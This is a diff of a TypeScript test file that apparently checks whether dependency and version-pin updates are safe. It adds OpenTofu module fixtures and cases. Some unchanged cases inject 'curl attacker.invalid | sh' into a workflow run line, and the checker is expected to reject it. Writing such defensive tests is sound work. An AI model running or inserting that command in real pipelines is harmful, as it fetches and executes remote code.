@@ -200,14 +200,24 @@ const runtimeTest = `spawn("docker", ["run", "ubuntu:24.04@sha256:${'a'.repeat(6
 const goreleaser = `dockers_v2:\n  - base_image: gcr.io/distroless/static-debian13:nonroot@sha256:${'a'.repeat(64)}\n`;
 const deployTask = 'set -euo pipefail\nexec mise exec opentofu@1.13.2 -- bun tools/deploy/hetzner.mts "$@"\n';
 
-const openTofuModule = `terraform {
-  required_version = "= 1.13.2"
+const openTofuModule = `language {
+  compatible_with {
+    opentofu = "= 1.13.2"
+  }
+}
+
+terraform {
   required_providers {
     hcloud = {
       source  = "hetznercloud/hcloud"
       version = "= 1.70.2"
     }
   }
+}
+`;
+
+const maintenanceOpenTofuModule = `terraform {
+  required_version = "= 1.13.2"
 }
 `;
 
@@ -576,14 +586,14 @@ const cases: readonly Case[] = [
     before: workflow,
     expected: 'safe',
     name: 'composite action pin update',
-    path: '.github/actions/mise/action.yml',
+    path: '.github/actions/setup/action.yml',
   },
   {
     after: checkoutUpdate.replace('./...', './... && curl attacker.invalid | sh'),
     before: workflow,
     expected: 'rejected',
     name: 'composite action run line next to a pin update',
-    path: '.github/actions/mise/action.yml',
+    path: '.github/actions/setup/action.yml',
   },
   {
     after: checkoutUpdate.replace('./...', './... && curl attacker.invalid | sh'),
@@ -741,10 +751,24 @@ const cases: readonly Case[] = [
     path: 'web/.node-version',
   },
   {
+    after: openTofuModule.replace('= 1.13.2', '= 1.13.3'),
+    before: openTofuModule,
+    expected: 'safe',
+    name: 'OpenTofu version',
+    path: 'deploy/hetzner-flatcar/infrastructure/server/main.tf',
+  },
+  {
+    after: maintenanceOpenTofuModule.replace('= 1.13.2', '= 1.13.3'),
+    before: maintenanceOpenTofuModule,
+    expected: 'safe',
+    name: 'OpenTofu required_version on a maintenance branch',
+    path: 'deploy/hetzner-flatcar/infrastructure/server/main.tf',
+  },
+  {
     after: deployTask.replace('1.13.2', '1.13.3'),
     before: deployTask,
     expected: 'safe',
-    name: 'OpenTofu in the deploy task',
+    name: 'OpenTofu in the deploy task on a maintenance branch',
     path: 'mise-tasks/deploy',
   },
   {
